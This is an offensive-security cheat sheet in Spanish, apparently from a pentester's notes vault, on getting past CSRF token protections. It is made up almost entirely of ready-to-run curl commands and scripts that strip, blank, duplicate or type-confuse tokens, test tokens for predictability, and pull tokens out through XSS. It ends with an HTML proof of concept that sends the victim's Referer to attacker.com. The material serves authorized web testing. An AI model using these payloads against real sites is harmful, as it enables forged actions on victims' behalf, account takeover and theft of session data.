---
aliases:
  - CSRF Token Bypass
  - Synchronizer Token Bypass
tags:
  - type/technique
  - vuln/csrf
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# CSRF - Bypass de Token

***

## Token No Validado (Remove)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -b "session=$COOKIE" https://target/action -d "k=v"` (sin csrf_token field) | Eliminar field por completo | Backend solo valida si presente. |
| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&k=v"` | Token empty string | Comparación `==` lax permite empty. |
| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=null&k=v"` | Token literal "null" | String "null" tratada como valid. |
| `curl -X POST -b "session=$COOKIE" -H "X-CSRF-Token:" https://target/action -d "k=v"` | Header empty | Header strip whitespace antes de comparar. |
| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&csrf_token=$LEAK"` | Duplicate field — server toma uno u otro | Parser depende del language. |
| Convertir POST a GET con query string: `curl -G "https://target/action" --data-urlencode "k=v" -b "session=$COOKIE"` | Endpoint acepta GET → no valida CSRF | Method-based bypass. |
| `for h in 'X-CSRF-Token' 'X-CSRFToken' 'X-XSRF-Token' 'CSRF-Token' 'csrf-token'; do curl ... -H "$h:" ...; done` | Probe variantes de header empty | Multiple header naming. |
^csrf-bypass-token-remove

___

## Token Validado Solo Si Presente

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d "csrf_token=AAAAAAAA&k=v"` | Token con valor inválido aceptado | Valida solo presencia, no contenido. |
| `curl -X POST -d "csrf_token=valid_+ extra&k=v"` (con concat) | String concat tolerated | Validation usa contains o startsWith. |
| `curl -X POST -d "csrftoken=$VALID&k=v"` (sin underscore) | Bypass via name change | Filter hardcodea nombre exacto. |
| `curl -X POST -d "_token=$VALID&k=v"` | Naming variant Laravel/Symfony | Per-framework. |
| `curl -X POST -H "Content-Type: application/json" -d '{"csrf_token":{"value":"x"},"k":"v"}'` | Type confusion (object en lugar de string) | Parser type-juggling. |
| `curl -X POST -d "csrf_token[]=garbage&k=v"` | Array notation | PHP/parsers tratan array distinto. |
| `curl -X POST -d "csrf_token=garbage&csrf_token=&k=v"` | Duplicate (legit + empty) | Server toma primer/último. |
| `curl -X POST -H "X-CSRF-Token: valid" -d "csrf_token=garbage&k=v"` | Header válido + body garbage | Backend acepta cualquiera. |
^csrf-bypass-token-presence

___

## Token Reuse / Fixed Value

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Capturar token de sesión atacante + usar en PoC contra víctima | Token compartido entre users (no session-bound) | Token global pool. |
| `for s in session_a session_b session_c; do curl --cookie "session=$s" https://target/csrf ; done \| sort -u` | Detectar si token es estático | Same value across users = vuln. |
| Capturar token semana pasada + replay hoy | Token sin TTL | Replay window infinito. |
| Login con creds atacante → capture token → usar contra víctima desde mismo IP | Token tied to IP solo | Wi-Fi compartido / corp network. |
| `for i in {1..100}; do curl ...; done \| jq .csrf_token \| sort -u` (analizar entropía) | Identificar pattern predecible | Counter/timestamp/UUIDv1. |
| `python3 -c "import hashlib; print(hashlib.md5(b'$SESSION_ID').hexdigest())"` | Test si token = MD5(session_id) | Token derivation predictable. |
| `grep -rE 'csrf.*=.*['\''\"][a-zA-Z0-9]{8,}['\''\"]' static/js/` | Hardcoded default token en JS | Disclosure de defaults. |
^csrf-bypass-token-reuse

___

## Token Tied to Non-Session

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Capturar token desde misma IP atacante + víctima → usar en víctima session | Token tied a IP, no session | Compartir red. |
| Replicar `User-Agent` exacto + capture token → reuse | Token tied a UA | UA-based binding. |
| `python3 -c "import hashlib; print(hashlib.sha256(b'$USER_ID').hexdigest())"` | Token derivado de user_id sin secret | Leak user_id → forge. |
| `t1=$(curl ... 2>&1); sleep 3600; t2=$(curl ...); diff <(echo $t1) <(echo $t2)` | Token rotated solo cada hora | Window grande replay. |
| Login atacante → capture token → mid-session swap a víctima cookie | Login CSRF → ATO chain | Multi-step. |
| Cookie `csrf=ABC` cross-subdomain (sin Domain restriction) | Combine con subdomain takeover | Cookie hijack via SDT. |
| `grep -rE 'csrf.*secret.*=' src/` | HMAC secret hardcoded en repo público | Universal forge. |
^csrf-bypass-token-tied

___

## Token Leak (Referer / URL)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<img src="https://attacker.com/log" id="img">` en página víctima → server atacante recibe Referer con URL completa | Token en URL leak via Referer cross-origin | Token en GET param. |
| `curl -sI https://target/action?csrf=$T \| grep -i referrer-policy` | Verificar política Referrer | Defense check. |
| `<iframe src="https://target/page?csrf=ABC"></iframe>` + `parent.frames[0].location` (XSS combo) | Cross-frame URL access | Same-origin frame. |
| `<script>fetch('//attacker?'+document.referrer)</script>` | Auto-exfil del Referer | XSS combo. |
| `grep -rE 'csrf[_-]token[^a-z]+["\x27][A-Za-z0-9]{20,}' static/js/` | Source disclosure de tokens | Tokens hardcoded en JS. |
| Inspeccionar `localStorage.getItem('csrf_token')` desde XSS | localStorage exfil | XSS chain. |
| `curl -s "https://target/error?path=../etc/passwd" \| grep csrf` | Token reflejado en error pages | Reflected token. |
| `<meta name="csrf-token" content="...">` lectura via XSS | Meta tag exfil | XSS combo. |
^csrf-bypass-token-leak

### Referer leak PoC

```html
<!-- Atacante hostea esto en attacker.com -->
<!-- Víctima visita https://target.com/transfer?csrf=ABC123 -->
<!-- Cuando víctima carga este HTML, navegador manda Referer al atacante -->
<img src="https://attacker.com/log" id="img">
<script>
  document.getElementById('img').onload = () => {
    fetch('https://attacker.com/exfil?ref='+document.referrer);
  };
</script>
```

***
